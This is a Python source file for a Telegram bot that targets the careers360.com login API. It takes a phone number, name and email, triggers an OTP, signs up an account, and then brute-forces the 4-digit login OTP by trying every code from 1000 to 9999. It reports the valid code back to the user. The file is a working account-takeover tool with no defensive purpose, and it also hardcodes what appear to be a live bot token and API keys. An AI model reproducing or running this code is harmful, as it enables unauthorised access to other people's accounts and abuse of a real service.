import requests
import asyncio
import random
import logging
import threading
import nest_asyncio
from flask import Flask
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Apply nest_asyncio to fix event loop issues
nest_asyncio.apply()

# Flask server for Koyeb
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Bot is running successfully!"

# Setup logging
logging.basicConfig(level=logging.INFO)

# Telegram Bot Token
TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"

# API Headers
HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "x-api-key": "xeJJzhaj1mQ-ksTB_nF_iH0z5YdG50yQtwQCzbcHuKA",
    "device-type": "mobile",
    "x-auth-key": "QeQohnkIqobSaDQITN02Ojpe3nC8dXn4hltbRt1t-TIb",
    "user-agent-key": "195696a6d915c14b",
    "Content-Type": "application/json"
}

# Random links
ASK_ME_LINKS = [
    "ebooks/jee-main-preparation-tips-complete-strategy-study-plan",
    "ebooks/jee-main-highest-scoring-chapters-and-topics"
]

# Command: /op to start the login process
async def op(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Send details in `{number} - {Name} - {email}` format.")

# Handling user input
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    try:
        mobile_number, user_name, user_email = map(str.strip, user_input.split("-"))
    except ValueError:
        await update.message.reply_text("❌ Invalid format! Use `{number} - {Name} - {email}`")
        return

    ask_me = random.choice(ASK_ME_LINKS)
    otp_url = "https://backend-cus.careers360.com/api/1/cus/otp-send"
    otp_data = {
        "otp_on": "mobile",
        "cta_clicked": "signup",
        "otp_action": "send",
        "isd_code": "+91",
        "mobile_number": mobile_number
    }

    msg = await update.message.reply_text("Otp Sent - 👍")

    otp_response = requests.post(otp_url, json=otp_data, headers=HEADERS)
    if otp_response.status_code == 200 and otp_response.json().get("result"):
        await msg.edit_text("Signup Successful - 👍")
    else:
        await msg.edit_text("❌ OTP Sending Failed.")
        return

    # Signup request
    signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
    signup_data = {
        "current_url": f"https://engineering.careers360.com/download/{ask_me}",
        "destination": f"https://engineering.careers360.com/download/{ask_me}",
        "cta_clicked": "signup",
        "country_code": "+91",
        "mobile_number": mobile_number,
        "email": user_email,
        "name": user_name,
        "submit": True
    }

    signup_response = requests.post(signup_url, json=signup_data, headers=HEADERS)
    if signup_response.status_code == 200 and signup_response.json().get("result"):
        user_uuid = signup_response.json()["data"].get("user_uuid")
    else:
        await msg.edit_text("❌ Signup failed.")
        return

    # OTP Brute-force
    login_url = "https://backend-cus.careers360.com/api/1/cus/login"
    found_otp = None
    checked_otps = 0

    for otp in range(1000, 10000):  # Checking OTPs
        login_data = {
            "current_url": f"https://engineering.careers360.com/download/{ask_me}",
            "destination": f"https://engineering.careers360.com/download/{ask_me}",
            "otp_on": "mobile",
            "country_code": "+91",
            "mobile_number": mobile_number,
            "otp": otp,
            "user_uuid": user_uuid
        }

        login_response = requests.post(login_url, json=login_data, headers=HEADERS)
        if login_response.status_code == 200 and login_response.json()["data"].get("otp_response") is True:
            found_otp = otp
            await msg.edit_text(f"Valid Otp - {otp}")
            break

        checked_otps += 1
        if checked_otps % 100 == 0:
            await msg.edit_text(f"Otp - Checked {checked_otps} OTPs")

    if found_otp:
        await msg.edit_text("Login Successful - 👍")
    else:
        await msg.edit_text("❌ OTP brute-force failed.")

# Function to run the Telegram bot
def run_telegram_bot():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("op", op))
    app.add_handler(CommandHandler("start", op))
    app.add_handler(CommandHandler("help", op))
    app.add_handler(CommandHandler("login", op))
    app.add_handler(CommandHandler("signup", op))
    app.add_handler(CommandHandler("retry", op))
    app.add_handler(CommandHandler("status", op))
    app.add_handler(CommandHandler("progress", op))
    app.add_handler(CommandHandler("check", op))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Bot started successfully!")
    app.run_polling()

# Start Flask server and Telegram bot
def start_services():
    # Start Flask server in a separate thread
    threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=5000, debug=False), daemon=True).start()

    # Run Telegram bot in the main thread
    run_telegram_bot()

if __name__ == "__main__":
    start_services()
